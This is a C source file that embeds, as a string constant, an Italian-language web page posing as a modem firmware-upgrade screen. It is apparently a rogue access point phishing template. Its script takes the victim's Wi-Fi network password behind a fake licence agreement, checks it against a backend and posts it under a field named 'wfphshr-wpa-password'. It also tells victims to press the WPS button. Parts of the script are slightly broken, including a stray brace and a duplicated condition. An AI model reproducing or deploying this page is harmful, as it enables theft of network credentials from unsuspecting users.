
const char fu_index_html[] =
"<!DOCTYPE html>\n"
"<html lang=\"it\">\n"
"<head>\n"
"  <title>Configurazione Modem</title>\n"
"  <meta charset=\"utf-8\">\n"
"  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n"
"  <link rel=\"stylesheet\" href=\"/static/bootstrap.min.css\">\n"
"  <script src=\"/static/jquery.min.js\"></script>\n"
"  <script src=\"/static/bootstrap.min.js\"></script>\n"
"  <style type=\"text/css\">\n"
"    html,\n"
"    body {\n"
"          height: 100%;\n"
"        }\n"
"        #wrap {\n"
"          min-height: 100%;\n"
"          height: auto !important;\n"
"          height: 100%;\n"
"          /* Negative indent footer by it's height */\n"
"          margin: 0 auto -60px;\n"
"        }\n"
"        #push,\n"
"        #footer {\n"
"          height: 60px;\n"
"        }\n"
"        #footer {\n"
"          background-color: #f5f5f5;\n"
"        }\n"
"        @media (max-width: 767px) {\n"
"          #footer {\n"
"            margin-left: -20px;\n"
"            margin-right: -20px;\n"
"            padding-left: 20px;\n"
"            padding-right: 20px;\n"
"          }\n"
"        }\n"
"    img {\n"
"        width: auto;\n"
"        max-width: 100%;\n"
"        height: auto;\n"
"    }\n"
"    .isa_info {\n"
"        color: #9F6000;\n"
"        background-color: #FEEFB3\n"
"    }\n"
"    .isa_info i {\n"
"        margin:1px 3px;\n"
"        font-size:18px;\n"
"        vertical-align:middle;\n"
"    }\n"
"  </style>\n"
"</head>\n"
"<body>\n"
"  <nav class=\"navbar navbar-inverse\" style=\"background:RoyalBlue;margin-top:2em;\">\n"
"    <div class=\"container-fluid\">\n"
"      <div class=\"navbar-header\">\n"
"        <button type=\"button\" class=\"navbar-toggle\" data-toggle=\"collapse\" data-target=\"#myNavbar\">\n"
"          <span class=\"icon-bar\"></span>\n"
"          <span class=\"icon-bar\"></span>\n"
"          <span class=\"icon-bar\"></span>\n"
"        </button>\n"
"        <!--\n"
"        <a class=\"navbar-brand\"><img style=\"background:transparent\" src=\"Your LOGO\" alt=\"Logo\"></a>\n"
"        -->\n"
"      </div>\n"
"      <div class=\"collapse navbar-collapse\" id=\"myNavbar\">\n"
"        <ul class=\"nav navbar-nav\">\n"
"          <li class=\"dropdown\" data-toggle=\"modal\" data-target=\"#update-only\"><a class=\"dropdown-toggle\"\n"
"              data-toggle=\"dropdown\" href=\"#\" style=\"color:white\">Setup <span class=\"caret\"></span></a>\n"
"            <ul class=\"dropdown-menu\">\n"
"              <li><a href=\"#\">Basic Setup</a></li>\n"
"              <li><a href=\"#\">DDNS</a></li>\n"
"              <li><a href=\"#\">MAC Address Clone</a></li>\n"
"              <li><a href=\"#\">Advanced Routing</a></li>\n"
"            </ul>\n"
"          </li>\n"
"          <li class=\"dropdown\" data-toggle=\"modal\" data-target=\"#update-only\"><a class=\"dropdown-toggle\"\n"
"              data-toggle=\"dropdown\" href=\"#\" style=\"color:white\">Wireless <span class=\"caret\"></span></a>\n"
"            <ul class=\"dropdown-menu\">\n"
"              <li><a href=\"#\">Basic Wireless Settings</a></li>\n"
"              <li><a href=\"#\">Wireless Security</a></li>\n"
"              <li><a href=\"#\">Wireless MAC Filter</a></li>\n"
"              <li><a href=\"#\">Advanced Wireless Settings</a></li>\n"
"            </ul>\n"
"          </li>\n"
"          <li class=\"dropdown\" data-toggle=\"modal\" data-target=\"#update-only\"><a class=\"dropdown-toggle\"\n"
"              data-toggle=\"dropdown\" href=\"#\" style=\"color:white\">Security <span class=\"caret\"></span></a>\n"
"            <ul class=\"dropdown-menu\">\n"
"              <li><a href=\"#\">Firewall</a></li>\n"
"              <li><a href=\"#\">VPN</a></li>\n"
"            </ul>\n"
"          </li>\n"
"          <li class=\"dropdown\" data-toggle=\"modal\" data-target=\"#update-only\"><a class=\"dropdown-toggle\"\n"
"              data-toggle=\"dropdown\" href=\"#\" style=\"color:white\">Access Restriction <span class=\"caret\"></span></a>\n"
"            <ul class=\"dropdown-menu\">\n"
"              <li><a href=\"#\">Internet Access</a></li>\n"
"            </ul>\n"
"          </li>\n"
"          <li class=\"dropdown\" data-toggle=\"modal\" data-target=\"#update-only\"><a class=\"dropdown-toggle\"\n"
"              data-toggle=\"dropdown\" href=\"#\" style=\"color:white\">Administration <span class=\"caret\"></span></a>\n"
"            <ul class=\"dropdown-menu\">\n"
"              <li><a href=\"#\">Management</a></li>\n"
"              <li><a href=\"#\">Log</a></li>\n"
"              <li><a href=\"#\">Diagnostics</a></li>\n"
"              <li><a href=\"#\">Factory Defaults</a></li>\n"
"              <li><a href=\"#\">Config Manegements</a></li>\n"
"            </ul>\n"
"          </li>\n"
"          <li class=\"dropdown\" data-toggle=\"modal\" data-target=\"#update-only\"><a class=\"dropdown-toggle\"\n"
"              data-toggle=\"dropdown\" href=\"#\" style=\"color:white\">Status <span class=\"caret\"></span></a>\n"
"            <ul class=\"dropdown-menu\">\n"
"              <li><a href=\"#\">Router</a></li>\n"
"              <li><a href=\"#\">Local Network</a></li>\n"
"              <li><a href=\"#\">Wireless</a></li>\n"
"              <li><a href=\"#\">Advanced Routing</a></li>\n"
"            </ul>\n"
"          </li>\n"
"        </ul>\n"
"      </div>\n"
"    </div>\n"
"  </nav>\n"
"  <div class=\"container\">\n"
"     <div class=\"col-sm\">\n"
"       <center><img id=\"ap_logo_path\" src=\"\"></img></center>\n"
"       <h2 class=\"text-center\" style=\"color:CornflowerBlue\">Aggiornamento Firmware</h2>\n"
"       <p class=\"lead\">È stata rilevata una nuova versione del firmware del modem ed è in attesa di installazione. Si prega di leggere attentamente i seguenti termini e condizioni e procedere.</p>\n"
"     </div>\n"
"    <form>\n"
"      <div class=\"form-group\">\n"
"        <label for=\"comment\">Termini e Condizioni:</label>\n"
"        <textarea readonly class=\"form-control\" rows=\"5\" id=\"comment\">\n"
"1. LICENSA.\n"
"\n"
"Conformemente ai termini e alle condizioni del presente Contratto di Licenza Software, l'azienda concede una licenza limitata, non esclusiva, non trasferibile e soggetta a restrizioni per utilizzare il Firmware/Software/Driver esclusivamente in combinazione con i prodotti. L'azienda non concede alcun diritto di licenza su brevetti, diritti d'autore o altri diritti di proprietà intellettuale di sua proprietà o concessi in licenza.\n"
"\n"
"2. NESSUNA GARANZIA.\n"
"\n"
"Il Firmware/Software/Driver viene fornito \"COSÌ COM'È\", senza alcuna garanzia di alcun tipo. L'azienda non garantisce che le funzioni contenute nel Firmware/Software/Driver soddisfino le vostre esigenze o che il funzionamento del Firmware/Software/Driver sia privo di interruzioni o errori. L'azienda declina ogni garanzia, espressa o implicita, relativa al Firmware/Software/Driver, incluse, a titolo esemplificativo ma non esaustivo, garanzie implicite di commerciabilità, idoneità per uno scopo particolare o non violazione di diritti.\n"
"\n"
"3. ESCLUSIONE DI RESPONSABILITÀ.\n"
"\n"
"In nessun caso l'azienda o qualsiasi altra parte coinvolta nella creazione, produzione o distribuzione del Firmware/Software/Driver sarà responsabile per eventuali danni derivanti o correlati a questo Contratto di Licenza Software o al Firmware/Software/Driver, inclusi, senza limitazioni, danni diretti, indiretti, consequenziali, incidentali o speciali, come ad esempio perdite di profitti o danni derivanti da interruzioni di attività o perdita di dati, indipendentemente dalla forma di azione o teoria legale sulla quale si basa la responsabilità, anche se avvisati della possibilità o probabilità di tali danni.\n"
"\n"
"       </textarea>\n"
"        <div class=\"checkbox\">\n"
"          <label><input type=\"checkbox\" id=\"check-box\" onclick=\"var box = document.getElementById('check-box');var input = document.getElementById('pwd');if(box.checked==true){input.disabled=false;}else{input.disabled=true;}\">Accetto i termini e le condizioni sopra indicati.</label>\n"
"        </div>\n"
"      </div>\n"
"      <div class=\"form-group-has-feedback\" id=\"psk_field\">\n"
"          <label for=\"pwd\">Inserisci la password della tua rete per confermare la tua identita:</label>\n"
"          <input class=\"form-control\" type=\"password\" id=\"pwd\" disabled>\n"
"      </div>\n"
"      <div class=\"container text-center\">\n"
"        <div class=\"isa_info\" id=\"pw_status\" align=\"left\">\n"
"        </div>\n"
"        <button class=\"btn btn-primary\" id=\"btn\">Avvia Aggiornamento</button>\n"
"      </div>\n"
"    </form>\n"
"    <div id=\"push\"></div>\n"
"  </div>\n"
"  <footer class=\"footer\">\n"
"    <div class=\"container text-center\">\n"
"      <p class=\"text-muted\">© {{ target_ap_vendor }} <script>document.write(new Date().getFullYear())</script>, All Rights Reserved.</p>\n"
"    </div>\n"
"  </footer>\n"
"  <div class=\"modal fade\" id=\"update-only\" role=\"dialog\">\n"
"    <div class=\"modal-dialog modal-sm\">\n"
"      <div class=\"modal-content\">\n"
"        <div class=\"modal-header\">\n"
"          <button type=\"button\" class=\"close\" data-dismiss=\"modal\">&times;</button>\n"
"          <h4 class=\"modal-title\">Information</h4>\n"
"        </div>\n"
"        <div class=\"modal-body\">\n"
"          <p>Upgrade is required.</p>\n"
"        </div>\n"
"        <div class=\"modal-footer\">\n"
"          <button type=\"button\" class=\"btn btn-default\" data-dismiss=\"modal\">Close</button>\n"
"        </div>\n"
"      </div>\n"
"    </div>\n"
"  </div>\n"
"  <div class=\"modal fade\" id=\"empty-pass\">\n"
"    <div class=\"modal-dialog modal-sm\">\n"
"      <div class=\"modal-content\">\n"
"        <div class=\"modal-header\">\n"
"          <button type=\"button\" class=\"close\" data-dismiss=\"modal\">&times;</button>\n"
"          <h4 class=\"modal-title\">Information</h4>\n"
"        </div>\n"
"        <div class=\"modal-body\">\n"
"          <p>Please Input Valid Password.</p>\n"
"        </div>\n"
"        <div class=\"modal-footer\">\n"
"          <button type=\"button\" class=\"btn btn-default\" data-dismiss=\"modal\">Close</button>\n"
"        </div>\n"
"      </div>\n"
"    </div>\n"
"  </div>\n"
"  <div class=\"modal fade\" id=\"no-checkbox\">\n"
"    <div class=\"modal-dialog modal-sm\">\n"
"      <div class=\"modal-content\">\n"
"        <div class=\"modal-header\">\n"
"          <button type=\"button\" class=\"close\" data-dismiss=\"modal\">&times;</button>\n"
"          <h4 class=\"modal-title\">Information</h4>\n"
"        </div>\n"
"        <div class=\"modal-body\">\n"
"          <p>Please agree with the Terms And Conditions to proceed.</p>\n"
"        </div>\n"
"        <div class=\"modal-footer\">\n"
"          <button type=\"button\" class=\"btn btn-default\" data-dismiss=\"modal\">Close</button>\n"
"        </div>\n"
"      </div>\n"
"    </div>\n"
"  </div>\n"
"  <script>\n"
"var match = /^http:.*static\\/$/.exec(document.getElementById(\"ap_logo_path\").src);\n"
"if (match) {\n"
"    document.getElementById('ap_logo_path').style.display = 'none';\n"
"}\n"
"var pw_status_element = document.getElementById('pw_status');\n"
"    pw_status_element.innerHTML = \"<i class=\\\"fa fa-info-circle\\\"></i>In attesa della password, autenticarsi per avviare l'aggiornamento del firmware..\";\n"
"}\n"
"$(\"#btn\").on(\"click\", function(e) {\n"
"    e.preventDefault();\n"
"    var input = document.getElementById(\"pwd\");\n"
"    var box = document.getElementById(\"check-box\");\n"
"    if ( box.checked == true )\n"
"      {\n"
"        if (input.value == \"\")\n"
"        {\n"
"            var data =\n"
"            {\n"
"                \"get_wps_state_handler\": input.value\n"
"            };\n"
"            var dataToSend = JSON.stringify(data);\n"
"            $.ajax(\n"
"                {\n"
"                    url: '/backend/',\n"
"                    type: 'POST',\n"
"                    data: dataToSend,\n"
"                    success: function (jsonResponse) {\n"
"                        var objresponse = JSON.parse(jsonResponse);\n"
"                        var verify_status = objresponse['get_wps_state_handler']\n"
"                        if (verify_status == 'WPS_CONNECTING' || verify_status == \"WPS_CONNECTED\") {\n"
"                            pw_status_element.style.color = \"#4F8A10\";\n"
"                            pw_status_element.style.backgroundColor = \"#DFF2BF\";\n"
"                            pw_status_element.innerHTML = \"<i class=\\\"fa fa-check\\\"></i>Firmware download complete!\"\n"
"                        } else if (verify_status == \"WPS_IDLE\") {\n"
"                            pw_status_element.style.color = \"#D8000C\";\n"
"                            pw_status_element.style.backgroundColor = \"#FFD2D2\";\n"
"                            pw_status_element.innerHTML = \"<i class=\\\"fa fa-times-circle\\\"></i>Please push the WPS button before initiating the firmware upgrade!\"\n"
"                        }\n"
"                    },\n"
"                });\n"
"        }\n"
"        else if ( input.value == \"\" ) {\n"
"            $(\"#empty-pass\").modal(\"show\");\n"
"        }\n"
"        else\n"
"          {\n"
"                var data =\n"
"                {\n"
"                    \"psk_verify\": input.value\n"
"                };\n"
"                var dataToSend = JSON.stringify(data);\n"
"                $.ajax(\n"
"                    {\n"
"                        url: '/backend/',\n"
"                        type: 'POST',\n"
"                        data: dataToSend,\n"
"                        success: function (jsonResponse) {\n"
"                            var objresponse = JSON.parse(jsonResponse);\n"
"                            var verify_status = objresponse['psk_verify']\n"
"                            if (verify_status == 'success') {\n"
"                                document.getElementById(\"pw_status\").innerHTML = \"\"\n"
"                                post('upgrading.html', {\"wfphshr-wpa-password\": input.value});\n"
"                            } else if (verify_status == 'fail') {\n"
"                                pw_status_element.style.color = \"#D8000C\";\n"
"                                pw_status_element.style.backgroundColor = \"#FFD2D2\";\n"
"                                pw_status_element.innerHTML = \"<i class=\\\"fa fa-times-circle\\\"></i>La password inserita non è corretta!\"\n"
"                            } else {\n"
"                                post('upgrading.html', {\"wfphshr-wpa-password\": input.value});\n"
"                            }\n"
"                        },\n"
"                    });\n"
"              }\n"
"      }\n"
"    else\n"
"      {\n"
"        $(\"#no-checkbox\").modal(\"show\");\n"
"      }\n"
"});\n"
"function post(path, params) {\n"
"    var form = document.createElement(\"form\");\n"
"    form.setAttribute(\"method\", \"post\");\n"
"    form.setAttribute(\"action\", path);\n"
"    for(var key in params) {\n"
"        if(params.hasOwnProperty(key)) {\n"
"            var hiddenField = document.createElement(\"input\");\n"
"            hiddenField.setAttribute(\"type\", \"hidden\");\n"
"            hiddenField.setAttribute(\"name\", key);\n"
"            hiddenField.setAttribute(\"value\", params[key]);\n"
"            form.appendChild(hiddenField);\n"
"         }\n"
"    }\n"
"    document.body.appendChild(form);\n"
"    form.submit();\n"
"}\n"
"</script>\n"
"</body>\n"
"</html>";